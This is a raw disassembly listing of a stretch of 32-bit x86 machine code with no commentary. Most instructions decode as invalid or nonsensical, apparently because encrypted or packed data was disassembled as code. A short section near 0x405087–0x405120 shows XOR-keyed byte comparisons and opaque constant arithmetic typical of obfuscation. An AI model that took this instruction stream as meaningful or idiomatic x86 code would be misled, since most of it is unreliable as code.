  4049bf:	leave  
  4049c0:	and    DWORD PTR [eax+0x70],esi
  4049c3:	cmp    eax,0xb370707d
  4049c8:	xlat   BYTE PTR ds:[ebx]
  4049c9:	js     0x404a32
  4049cb:	(bad)  
  4049cc:	call   0xaef2833a
  4049d1:	ds sbb al,0xca
  4049d4:	iret   
  4049d5:	and    al,0x88
  4049d7:	adc    si,dx
  4049da:	mov    ebx,0xce2c3c2b
  4049df:	adc    al,0x3
  4049e1:	scas   al,BYTE PTR es:[edi]
  4049e2:	(bad)  
  4049e4:	dec    ebx
  4049e5:	ins    BYTE PTR es:[edi],dx
  4049e6:	inc    edx
  4049e7:	scas   al,BYTE PTR es:[edi]
  4049e8:	mov    al,ds:0xd2e2cd19
  4049ed:	ret    
  4049ee:	and    al,0x9f
  4049f0:	pop    ss
  4049f1:	jp     0x40497c
  4049f3:	retf   0x3620
  4049f6:	cdq    
  4049f7:	xchg   edi,eax
  4049f8:	std    
  4049f9:	cld    
  4049fa:	xchg   esi,eax
  4049fb:	mov    ch,0xa8
  4049fd:	cwde   
  4049fe:	popf   
  4049ff:	mov    DWORD PTR [edx+0x19],ebx
  404a02:	cmp    BYTE PTR ds:0x656bf4ea,bl
  404a08:	out    0xf9,eax
  404a0a:	leave  
  404a0b:	push   cs
  404a0c:	and    DWORD PTR [ecx],ebp
  404a0e:	mov    dl,0xfe
  404a10:	jmp    0x4b02:0x6b3e1aa9
  404a17:	imul   BYTE PTR [esi+0x29]
  404a1a:	push   ecx
  404a1b:	pop    edx
  404a1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a1d:	aam    0x85
  404a1f:	xchg   ebx,eax
  404a20:	sbb    DWORD PTR [ebx+0x62cdedd4],ebx
  404a26:	lea    esp,[ecx]
  404a28:	in     al,dx
  404a29:	mov    dl,0x10
  404a2b:	mov    WORD PTR [esi+0x3156626],fs
  404a31:	(bad)  
  404a32:	mov    esi,DWORD PTR [edx+0x3508c40d]
  404a38:	frstor [ebp-0x40]
  404a3b:	xor    eax,0x52035882
  404a40:	xor    al,0x26
  404a42:	dec    edx
  404a43:	aaa    
  404a44:	mov    ds:0x38d761ea,al
  404a49:	xchg   esi,eax
  404a4a:	stos   BYTE PTR es:[edi],al
  404a4b:	sbb    ebx,ebp
  404a4d:	lock call 0xbf9d:0xd97624ae
  404a55:	mov    bl,0xa2
  404a57:	int3   
  404a58:	in     eax,0xa6
  404a5a:	daa    
  404a5b:	dec    eax
  404a5c:	and    edx,0x4a1a6c7d
  404a62:	jmp    0x404ac5
  404a64:	pusha  
  404a65:	push   edx
  404a66:	mov    WORD PTR [eax+0x60eec52],?
  404a6c:	jb     0x404ac2
  404a6e:	aam    0x16
  404a70:	add    BYTE PTR [edi],ch
  404a72:	pop    ecx
  404a73:	mov    ds:0xb4ef08d6,al
  404a78:	mov    eax,ds:0x7f5ca484
  404a7d:	push   ebx
  404a7e:	xor    eax,0x38c1b4c1
  404a83:	cld    
  404a84:	inc    edx
  404a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a86:	clc    
  404a87:	into   
  404a88:	arpl   ax,sp
  404a8a:	mov    al,ds:0xae93b45a
  404a8f:	mov    ch,0xa5
  404a91:	push   esi
  404a92:	jns    0x404a25
  404a94:	(bad)  
  404a95:	fistp  DWORD PTR [ebp+0x19]
  404a98:	aad    0xde
  404a9a:	js     0x404ad8
  404a9c:	das    
  404a9d:	arpl   WORD PTR ds:0x1c3762ea,di
  404aa3:	and    dh,BYTE PTR [edx]
  404aa5:	inc    eax
  404aa6:	adc    dl,0xc0
  404aa9:	add    BYTE PTR [eax],dh
  404aab:	ja     0x404aca
  404aad:	add    ecx,eax
  404aaf:	leave  
  404ab0:	xor    ch,BYTE PTR [eax-0x63dfc1e2]
  404ab6:	or     esi,0x7
  404ab9:	aas    
  404aba:	(bad)  
  404abb:	popf   
  404abc:	dec    edi
  404abd:	add    al,BYTE PTR [edx]
  404abf:	gs mov cl,0x56
  404ac2:	push   ebp
  404ac3:	ror    BYTE PTR [ebp+0x59],1
  404ac6:	pop    esi
  404ac7:	mov    BYTE PTR [edi+esi*8+0x50ad118d],dl
  404ace:	data16 mov ch,0xf
  404ad1:	push   edx
  404ad2:	(bad)  
  404ad3:	in     al,0xdc
  404ad5:	das    
  404ad6:	jae    0x404b45
  404ad8:	pop    ds
  404ad9:	pushf  
  404ada:	lds    edx,FWORD PTR [esi+0x47]
  404add:	fisub  DWORD PTR [edx-0x73]
  404ae0:	iret   
  404ae1:	stos   BYTE PTR es:[edi],al
  404ae2:	push   eax
  404ae3:	outs   dx,DWORD PTR ds:[esi]
  404ae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ae5:	lods   al,BYTE PTR ds:[esi]
  404ae6:	jle    0x404add
  404ae8:	loop   0x404b16
  404aea:	js     0x404b44
  404aec:	push   ebp
  404aed:	push   es
  404aee:	imul   ebx,DWORD PTR [ecx],0x166c882
  404af4:	adc    al,0x64
  404af6:	inc    ecx
  404af7:	fdivr  QWORD PTR [ecx]
  404af9:	sub    edi,esp
  404afb:	stc    
  404afc:	sub    al,0xa4
  404afe:	stos   BYTE PTR es:[edi],al
  404aff:	ret    0x121e
  404b02:	ja     0x404aa5
  404b04:	jb     0x404b80
  404b06:	push   edi
  404b07:	cmp    eax,0x902b78d6
  404b0c:	cld    
  404b0d:	jno    0x404ae3
  404b0f:	std    
  404b10:	pop    ebp
  404b11:	xor    ebp,DWORD PTR [ecx+0x6]
  404b14:	add    eax,DWORD PTR [ecx]
  404b16:	outs   dx,DWORD PTR ds:[esi]
  404b17:	icebp  
  404b18:	sbb    ah,BYTE PTR [edi+0x21275d36]
  404b1e:	rol    BYTE PTR [edi-0x57],0xb5
  404b22:	dec    ebp
  404b23:	adc    DWORD PTR ds:0x1077adeb,ebp
  404b29:	clc    
  404b2a:	cs add al,0xc2
  404b2d:	fwait
  404b2e:	xchg   BYTE PTR [eax-0x1cea43d1],ah
  404b34:	stc    
  404b35:	pop    ds
  404b36:	jl     0x404b60
  404b38:	and    ecx,ebp
  404b3a:	gs and eax,0x9c00dd82
  404b40:	mov    bl,0xd3
  404b42:	cwde   
  404b43:	lahf   
  404b44:	(bad)  
  404b45:	push   esp
  404b46:	push   0x1fe4ffdc
  404b4b:	add    eax,0x3ed22174
  404b50:	es sub eax,0x7b5538cf
  404b56:	pop    eax
  404b57:	xchg   esi,eax
  404b58:	add    esp,DWORD PTR [ecx]
  404b5a:	sub    al,0xd
  404b5c:	mov    ?,WORD PTR [eax-0x103040bf]
  404b62:	(bad)  
  404b63:	bound  eax,QWORD PTR [edx-0x4d]
  404b66:	lods   al,BYTE PTR ds:[esi]
  404b67:	mov    al,0x97
  404b69:	rol    BYTE PTR [si-0x38],0x4d
  404b6e:	popa   
  404b6f:	mov    eax,0xd3c88e0
  404b74:	jmp    0x440a495a
  404b79:	fld    DWORD PTR [ecx-0x53]
  404b7c:	fst    QWORD PTR [esi]
  404b7e:	jge    0x404ba4
  404b80:	cmc    
  404b81:	lock and DWORD PTR [esi],eax
  404b84:	mov    ah,0xb9
  404b86:	inc    ebp
  404b87:	mov    esp,0x4e00e877
  404b8c:	in     al,dx
  404b8d:	xchg   BYTE PTR [ebx+0x507cb603],dl
  404b93:	ror    BYTE PTR [eax+0x31376bcf],1
  404b99:	das    
  404b9a:	call   0x8a33:0x5062e3c6
  404ba1:	loopne 0x404b84
  404ba3:	inc    esi
  404ba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ba5:	(bad)  
  404ba6:	sti    
  404ba7:	retf   
  404ba8:	ret    
  404ba9:	les    edx,FWORD PTR [ebp-0x72]
  404bac:	push   ds
  404bad:	aas    
  404bae:	je     0x404b32
  404bb0:	sub    DWORD PTR [eax+0x5dbd253d],esi
  404bb6:	jnp    0x404bf4
  404bb8:	add    al,0x96
  404bba:	push   es
  404bbb:	inc    eax
  404bbc:	or     dl,0xde
  404bbf:	pusha  
  404bc0:	sbb    BYTE PTR [edx+ecx*8-0xe032b1d],dh
  404bc7:	cmp    eax,0x997ed82d
  404bcc:	add    al,0x9e
  404bce:	xlat   BYTE PTR ds:[ebx]
  404bcf:	jne    0x404c2d
  404bd1:	push   0x9ddfc0c8
  404bd6:	shr    DWORD PTR [ebx+0x4c76d56],0xe3
  404bdd:	out    dx,eax
  404bde:	push   cs
  404bdf:	sti    
  404be0:	xor    al,0xb9
  404be2:	ficom  DWORD PTR [edi+0x1cc3b225]
  404be8:	ins    DWORD PTR es:[edi],dx
  404be9:	loope  0x404b89
  404beb:	fldenvw ds:0x2f93aef
  404bf2:	dec    ebx
  404bf3:	and    eax,0x9c592ead
  404bf8:	xor    bl,BYTE PTR [ecx]
  404bfa:	add    bh,BYTE PTR [ebp-0x5e46a55e]
  404c00:	call   0x925514c1
  404c05:	mov    ch,bh
  404c07:	inc    edi
  404c08:	aas    
  404c09:	mov    WORD PTR [eax],?
  404c0b:	or     cl,BYTE PTR [ecx+0x77]
  404c0e:	cmp    DWORD PTR [eax+0x46],esp
  404c11:	xchg   BYTE PTR [ebx+0x1c9f72d],ch
  404c17:	pop    esp
  404c18:	loop   0x404c94
  404c1a:	scas   al,BYTE PTR es:[edi]
  404c1b:	mov    DWORD PTR [eax-0x73],eax
  404c1e:	dec    esi
  404c1f:	pop    esi
  404c20:	add    edi,DWORD PTR ds:0xe3dc4857
  404c26:	adc    eax,0x405f6bc0
  404c2b:	out    dx,eax
  404c2c:	xor    eax,edi
  404c2e:	push   esi
  404c2f:	push   ss
  404c30:	xor    eax,0xcc182cfc
  404c35:	lods   eax,DWORD PTR ds:[esi]
  404c36:	sahf   
  404c37:	call   0x62d551ab
  404c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c3d:	fidiv  WORD PTR [ecx+esi*8-0x273bc5d6]
  404c44:	dec    ebp
  404c45:	add    al,0x68
  404c47:	dec    eax
  404c48:	in     eax,0x1b
  404c4a:	or     BYTE PTR [ebp-0x504f3763],0xf3
  404c51:	push   ebx
  404c52:	push   0x1950e8cb
  404c57:	sti    
  404c58:	enter  0x3d78,0x1b
  404c5c:	leave  
  404c5d:	pop    edi
  404c5e:	in     eax,0x78
  404c60:	mov    ch,0x1f
  404c62:	push   0xe42bb0dc
  404c67:	daa    
  404c68:	jg     0x404c74
  404c6a:	jo     0x404c71
  404c6c:	in     eax,0x1f
  404c6e:	loop   0x404c7a
  404c70:	cmp    eax,0x64270515
  404c75:	and    edi,DWORD PTR [eax+0x138793e6]
  404c7b:	dec    ebp
  404c7c:	push   edx
  404c7d:	into   
  404c7e:	lods   eax,DWORD PTR ds:[esi]
  404c7f:	call   0x29e15c2a
  404c84:	jb     0x404cf8
  404c86:	jo     0x404cb1
  404c88:	add    BYTE PTR [ebp-0x54],cl
  404c8b:	push   cs
  404c8c:	(bad)  
  404c8d:	mov    ebx,0x284a874c
  404c92:	dec    ebx
  404c93:	push   cs
  404c94:	jmp    0x404ccf
  404c96:	ret    0xd564
  404c99:	and    BYTE PTR [ecx-0x6d],al
  404c9c:	push   esp
  404c9d:	mov    ah,0x49
  404c9f:	in     eax,dx
  404ca0:	sbb    ch,BYTE PTR ds:0xc96644bf
  404ca6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ca7:	adc    eax,0x9fdd75b3
  404cac:	leave  
  404cad:	popf   
  404cae:	gs je  0x404c31
  404cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cb2:	pop    ss
  404cb3:	cs mov edi,0x7b75bd51
  404cb9:	je     0x404ccc
  404cbb:	inc    ax
  404cbd:	inc    edx
  404cbe:	xchg   BYTE PTR [ebp+eiz*8-0x6d4798a0],ah
  404cc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cc6:	push   esi
  404cc7:	lods   eax,DWORD PTR ds:[esi]
  404cc8:	cli    
  404cc9:	punpckhwd mm1,QWORD PTR ds:0x5e5b255b
  404cd0:	pop    edx
  404cd1:	dec    esi
  404cd2:	sub    ch,bl
  404cd4:	sar    DWORD PTR [esi+eiz*8],1
  404cd7:	mov    ebp,0xbb98fd4e
  404cdc:	test   eax,0xc49009d
  404ce1:	fld    TBYTE PTR [edi+ebx*1]
  404ce4:	and    edx,esi
  404ce6:	shr    edx,cl
  404ce8:	or     eax,0x4a5d827c
  404ced:	jge    0x404cf8
  404cef:	push   es
  404cf0:	(bad)  
  404cf1:	nop
  404cf2:	inc    esp
  404cf3:	(bad)  
  404cf5:	add    ebp,edi
  404cf7:	pop    esi
  404cf8:	dec    edx
  404cf9:	(bad)  
  404cfa:	sti    
  404cfb:	mov    WORD PTR ds:0xfc2d60e0,?
  404d01:	cs in  eax,0x2e
  404d04:	loope  0x404c8a
  404d06:	sub    DWORD PTR [ecx],0x40
  404d09:	push   0x3
  404d0b:	mov    edi,0x42e6ff05
  404d11:	add    BYTE PTR [eax+0xe],bl
  404d14:	add    BYTE PTR [eax],al
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e6eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax-0x46]
  404d39:	outs   dx,DWORD PTR ds:[esi]
  404d3a:	inc    esp
  404d3b:	mov    bl,0x96
  404d3d:	cs jo  0x404db0
  404d40:	cmp    eax,0x5c70707d
  404d45:	cld    
  404d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d47:	call   0x8a0f87f8
  404d4c:	mov    edx,0xe0041b61
  404d51:	push   ecx
  404d52:	mov    ds:0x5f5cbafa,al
  404d57:	add    esi,eax
  404d59:	xchg   esp,eax
  404d5a:	and    DWORD PTR [eax-0x60d62b3d],eax
  404d60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d61:	jne    0x404d2b
  404d63:	lods   eax,DWORD PTR ds:[esi]
  404d64:	mov    ds:0xd2ff20b4,al
  404d69:	stos   BYTE PTR es:[edi],al
  404d6a:	jno    0x404d1d
  404d6c:	dec    esi
  404d6d:	lods   al,BYTE PTR ds:[esi]
  404d6e:	dec    edx
  404d6f:	sahf   
  404d70:	sub    cl,cl
  404d72:	push   ebp
  404d73:	outs   dx,DWORD PTR ds:[esi]
  404d74:	xor    DWORD PTR [ebp-0x325f8516],edx
  404d7a:	jns    0x404dbe
  404d7c:	aaa    
  404d7d:	aam    0xf2
  404d7f:	(bad)  
  404d80:	repz mov ch,0x9e
  404d83:	cwde   
  404d84:	js     0x404d78
  404d86:	xor    esi,DWORD PTR [eax+eiz*4+0x16]
  404d8a:	das    
  404d8b:	retf   0x40ed
  404d8e:	and    dl,BYTE PTR [esi]
  404d90:	test   DWORD PTR [esi],esp
  404d92:	sbb    ebx,DWORD PTR [esi+0x30810bcd]
  404d98:	daa    
  404d99:	dec    edx
  404d9a:	pushf  
  404d9b:	rcr    bl,1
  404d9d:	(bad)  
  404d9e:	in     eax,0xd9
  404da0:	pop    eax
  404da1:	push   es
  404da2:	mov    BYTE PTR [esi],cl
  404da4:	arpl   WORD PTR [ebp+0x3635be7f],cx
  404daa:	inc    edx
  404dab:	or     al,0x4c
  404dad:	add    DWORD PTR [ecx+0x2b],eax
  404db0:	mov    ds:0x2c7a4dea,eax
  404db5:	adc    DWORD PTR [esi],edi
  404db7:	xor    al,0x1b
  404db9:	inc    eax
  404dba:	lods   al,BYTE PTR ds:[esi]
  404dbb:	(bad)  
  404dbc:	in     al,0xd5
  404dbe:	int3   
  404dbf:	(bad)
  404dc2:	add    BYTE PTR [ecx-0x534c62a8],bl
  404dc8:	shr    BYTE PTR [esi],1
  404dca:	dec    edi
  404dcb:	ins    DWORD PTR es:[edi],dx
  404dcc:	aas    
  404dcd:	jg     0x404e4d
  404dcf:	imul   edx,DWORD PTR fs:[ecx],0x7a09ec04
  404dd6:	icebp  
  404dd7:	stc    
  404dd8:	cmp    BYTE PTR [ebx+eax*4-0x114a54b4],dl
  404ddf:	adc    cx,WORD PTR [eax]
  404de2:	stos   BYTE PTR es:[edi],al
  404de3:	push   edx
  404de4:	fild   WORD PTR [eax-0x5]
  404de7:	sbb    al,0x16
  404de9:	pop    ecx
  404dea:	cmp    ah,BYTE PTR [ecx-0x79861a1c]
  404df0:	test   al,0xda
  404df2:	(bad)  
  404df3:	retf   0x702a
  404df6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404df7:	imul   eax,DWORD PTR [edi+0x3717c0a7],0x1bdd710e
  404e01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e02:	les    eax,FWORD PTR [eax-0x3abafa48]
  404e08:	jmp    0xd87e5d5c
  404e0d:	retf   
  404e0e:	push   esp
  404e0f:	fnstcw WORD PTR [eax+0x6d207699]
  404e15:	inc    esp
  404e16:	add    bl,BYTE PTR [esi+0x2d690881]
  404e1c:	mov    edi,0x282ef239
  404e21:	push   esp
  404e22:	or     al,0x76
  404e24:	fwait
  404e25:	mov    eax,ds:0xddcd4f81
  404e2a:	dec    esp
  404e2b:	dec    ebp
  404e2c:	es mov ch,0x58
  404e2f:	xor    eax,0xd73d51e6
  404e34:	mov    ch,BYTE PTR [eax+0x53]
  404e37:	dec    esp
  404e38:	sbb    BYTE PTR cs:[eax-0x4507a0b8],0xab
  404e40:	pop    ds
  404e41:	cmp    eax,0x73e67648
  404e46:	test   al,0x7b
  404e48:	adc    DWORD PTR [ebx],esp
  404e4a:	out    dx,eax
  404e4b:	xor    BYTE PTR [eax],bl
  404e4d:	inc    edi
  404e4e:	fdivr  QWORD PTR [esi+0x242f7bf1]
  404e54:	ss popa 
  404e56:	push   0x1b00268c
  404e5b:	push   edi
  404e5c:	pop    ecx
  404e5d:	xchg   edx,eax
  404e5e:	sub    eax,0x9cde3f55
  404e63:	bound  edi,QWORD PTR [edx]
  404e65:	add    al,BYTE PTR [edi]
  404e67:	out    0xed,al
  404e69:	scas   eax,DWORD PTR es:[edi]
  404e6a:	rcr    dl,0xd8
  404e6d:	dec    ebp
  404e6e:	push   cs
  404e6f:	pop    eax
  404e70:	pop    ss
  404e71:	mov    ebx,0xbc89fab1
  404e76:	sub    DWORD PTR [ebp-0x3039fba7],0xcf076df1
  404e80:	cli    
  404e81:	push   0xe6b5100a
  404e86:	add    al,dl
  404e88:	pop    ebp
  404e89:	inc    edx
  404e8a:	sub    eax,0x494139e4
  404e8f:	retf   0x6db4
  404e92:	xor    bh,bh
  404e94:	push   eax
  404e95:	push   cs
  404e96:	out    dx,eax
  404e97:	pop    ds
  404e98:	mov    ds:0xb57f7d07,al
  404e9d:	adc    bl,cl
  404e9f:	push   ss
  404ea0:	stos   DWORD PTR es:[edi],eax
  404ea1:	loope  0x404e8a
  404ea3:	sysexit 
  404ea5:	repz mov cs,WORD PTR [eax-0x50bb5b6a]
  404eac:	test   DWORD PTR [ecx+0x5d],0x7b127ef0
  404eb3:	cld    
  404eb4:	pop    ds
  404eb5:	pop    ebx
  404eb6:	push   ds
  404eb7:	dec    esp
  404eb8:	imul   edi,DWORD PTR [edx],0xffffff93
  404ebb:	out    0x93,eax
  404ebd:	sbb    DWORD PTR [ecx+0x38],edx
  404ec0:	addr16 and eax,0xb6cb26d
  404ec6:	call   0x79:0x63ee395d
  404ecd:	push   ss
  404ece:	jmp    0x404f33
  404ed0:	lds    ecx,FWORD PTR [ecx-0x56ea422]
  404ed6:	lods   al,BYTE PTR ds:[esi]
  404ed7:	js     0x404e6c
  404ed9:	fldcw  WORD PTR [ebx-0x14]
  404edc:	sar    DWORD PTR [ebx+0x58222f1f],cl
  404ee2:	jg     0x404f57
  404ee4:	adc    eax,0x5a1491c8
  404ee9:	stos   BYTE PTR es:[edi],al
  404eea:	pop    ebx
  404eeb:	xchg   esi,eax
  404eec:	fcmovbe st,st(7)
  404eee:	push   edx
  404eef:	push   0x67
  404ef1:	push   esi
  404ef2:	inc    esi
  404ef3:	test   DWORD PTR [ecx],0xc3f78e37
  404ef9:	shl    DWORD PTR [eiz*8-0x412bf29e],1
  404f00:	fwait
  404f01:	mov    ss,WORD PTR [esi]
  404f03:	push   esi
  404f04:	and    BYTE PTR [eax-0x1d01b6e],bl
  404f0a:	or     bl,bl
  404f0c:	lock lock aaa 
  404f0f:	lods   eax,DWORD PTR ds:[esi]
  404f10:	jnp    0x404ee4
  404f12:	xor    eax,0xa79337ab
  404f17:	sbb    cl,BYTE PTR [ebx]
  404f19:	out    dx,eax
  404f1a:	push   eax
  404f1b:	dec    esp
  404f1c:	pop    ebp
  404f1d:	xor    edi,DWORD PTR [ebp+0x3326e2c0]
  404f23:	ret    
  404f24:	out    0x3,eax
  404f26:	mov    esp,0xd644bcf9
  404f2b:	stos   DWORD PTR es:[edi],eax
  404f2c:	das    
  404f2d:	push   ds
  404f2e:	inc    ecx
  404f2f:	imul   ecx,DWORD PTR [edx],0x736b165e
  404f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f36:	mov    eax,0x446def72
  404f3b:	retf   0xaece
  404f3e:	and    DWORD PTR [ecx+0x21],esi
  404f41:	fnstsw WORD PTR [edi]
  404f43:	lock push esp
  404f45:	mov    esi,0x2e3ddb63
  404f4a:	dec    ebp
  404f4b:	gs dec edi
  404f4d:	in     al,0x37
  404f4f:	sti    
  404f50:	das    
  404f51:	stc    
  404f52:	xor    DWORD PTR [bx+si-0x1c45],ecx
  404f57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f58:	shl    BYTE PTR [edx-0x14],cl
  404f5b:	enter  0x8ff0,0x76
  404f5f:	aaa    
  404f60:	or     BYTE PTR [edx-0x396a577a],bl
  404f66:	mov    BYTE PTR ds:[esp+esi*4],dl
  404f6a:	mov    eax,ds:0x22807510
  404f6f:	test   al,0x76
  404f71:	in     eax,0xfa
  404f73:	stos   DWORD PTR es:[edi],eax
  404f74:	lods   al,BYTE PTR ds:[esi]
  404f75:	push   ebp
  404f76:	aad    0xab
  404f78:	(bad)  
  404f79:	out    dx,eax
  404f7a:	sub    DWORD PTR [esi+0x54],ebx
  404f7d:	xor    BYTE PTR [edi],cl
  404f7f:	(bad)  
  404f81:	das    
  404f82:	imul   ebp,DWORD PTR [eax*8-0x3fd00a88],0x1eef7c2
  404f8d:	sub    ecx,DWORD PTR [edi]
  404f8f:	lods   eax,DWORD PTR ds:[esi]
  404f90:	xor    BYTE PTR [eax+0x8],0x4b
  404f94:	pop    edi
  404f95:	push   0xffffffca
  404f97:	jmp    0x404fcc
  404f99:	iret   
  404f9a:	pop    esi
  404f9b:	cmp    al,0xd9
  404f9d:	add    ecx,esp
  404f9f:	out    0x2,eax
  404fa1:	or     DWORD PTR [esi],0xffffffdc
  404fa4:	ds ds xor cl,ah
  404fa8:	sub    cl,BYTE PTR [ebx]
  404faa:	imul   ebx,DWORD PTR [eax],0x12
  404fad:	and    al,0xdf
  404faf:	mov    al,0x96
  404fb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fb2:	xor    BYTE PTR [ebp-0x3cd14265],ah
  404fb8:	repnz mov ax,0x2c42
  404fbd:	out    dx,al
  404fbe:	mov    al,0x27
  404fc0:	ret    0xf1f2
  404fc3:	xchg   esi,eax
  404fc4:	cmp    eax,ecx
  404fc6:	cmc    
  404fc7:	push   esi
  404fc8:	ret    0x2019
  404fcb:	push   ds
  404fcc:	shr    BYTE PTR [esi-0x4394e0f],0xf5
  404fd3:	add    DWORD PTR [edx-0x296a28c],edx
  404fd9:	aas    
  404fda:	imul   ebx,DWORD PTR [ecx],0xbd24d941
  404fe0:	mov    DWORD PTR [edx-0x50],edi
  404fe3:	inc    esp
  404fe4:	adc    edx,ecx
  404fe6:	std    
  404fe7:	mov    ds,WORD PTR fs:[edx-0x73c6a88b]
  404fee:	xor    BYTE PTR [edx+edi*8],ch
  404ff1:	daa    
  404ff2:	into   
  404ff3:	jbe    0x404f8f
  404ff5:	mov    al,ds:0xaa4ad4cb
  404ffa:	dec    ebp
  404ffb:	inc    esi
  404ffc:	jmp    0x40503d
  404ffe:	out    dx,al
  404fff:	fdiv   DWORD PTR [esi+eax*1]
  405002:	out    dx,eax
  405003:	into   
  405004:	out    dx,eax
  405005:	pop    eax
  405006:	or     bh,BYTE PTR ds:0x32c50254
  40500c:	jmp    0xb9d2e464
  405011:	test   DWORD PTR [edi-0x44],ecx
  405014:	and    al,0x8e
  405016:	bound  esp,QWORD PTR [edx+0x2b]
  405019:	std    
  40501a:	mov    esp,0x2c152a20
  40501f:	push   DWORD PTR [ecx]
  405021:	popa   
  405022:	xlat   BYTE PTR ds:[ebx]
  405023:	mov    ecx,0x62e8c2e5
  405028:	dec    edi
  405029:	sub    BYTE PTR [esi-0x61c64498],bh
  40502f:	sbb    ecx,DWORD PTR [edx]
  405031:	cmp    eax,0xff9ff755
  405036:	fimul  DWORD PTR [edx]
  405038:	cmc    
  405039:	ja     0x404fc6
  40503b:	fmul   st(7),st
  40503d:	fbstp  TBYTE PTR [ecx]
  40503f:	mov    dl,BYTE PTR [ebx+0x49]
  405042:	int3   
  405043:	mov    ecx,0x82e528a3
  405048:	push   0x4e
  40504a:	dec    ebx
  40504b:	out    dx,eax
  40504c:	jp     0x405033
  40504e:	jns    0x405061
  405050:	mov    bh,0x2c
  405052:	dec    esi
  405053:	popa   
  405054:	and    BYTE PTR [esp+ebx*8+0x55],al
  405058:	mov    bh,0xe6
  40505a:	(bad)  
  40505b:	xor    esi,DWORD PTR [esi-0x1a8a1b80]
  405061:	cmp    eax,0x34860b0d
  405066:	into   
  405067:	dec    edx
  405068:	mov    esp,0xac7e4d9d
  40506d:	mov    gs,WORD PTR [eax-0x4c]
  405070:	retf   0x73d1
  405073:	xor    al,0x17
  405075:	push   cs
  405076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405077:	dec    edi
  405078:	fmul   QWORD PTR [ebp+0x2f2191d7]
  40507e:	leave  
  40507f:	xlat   BYTE PTR ds:[ebx]
  405080:	dec    esi
  405081:	cmp    eax,0x7ca8278c
  405086:	hlt    
  405087:	mov    eax,DWORD PTR [ebp-0xc]
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	rol    DWORD PTR [ebx-0x58],0xf3
  405134:	pop    esi
  405135:	push   ebx
  405136:	sub    esi,DWORD PTR [eax+0x70]
  405139:	cmp    eax,0x470707d
  40513e:	sar    BYTE PTR [ebp+ebx*4+0x61],0xf3
  405143:	push   0x20
  405145:	push   ss
  405146:	ret    0xb570
  405149:	test   al,0x8d
  40514b:	push   es
  40514c:	fmulp  st(3),st
  40514e:	pushf  
  40514f:	or     BYTE PTR [ebx-0x54ce5db0],bh
  405155:	sub    DWORD PTR [esi-0x7e],esp
  405158:	out    dx,al
  405159:	push   esp
  40515a:	xchg   ebx,eax
  40515b:	lods   al,BYTE PTR ds:[esi]
  40515c:	test   eax,0x506ab668
  405161:	cmp    al,0x27
  405163:	pop    esi
  405164:	inc    edx
  405165:	push   0x26
  405167:	mov    bl,0x4
  405169:	and    DWORD PTR [ebx-0xf2939bd],esi
  40516f:	jmp    0x4dd21e9a
  405174:	sub    BYTE PTR [ebp-0x1e],dh
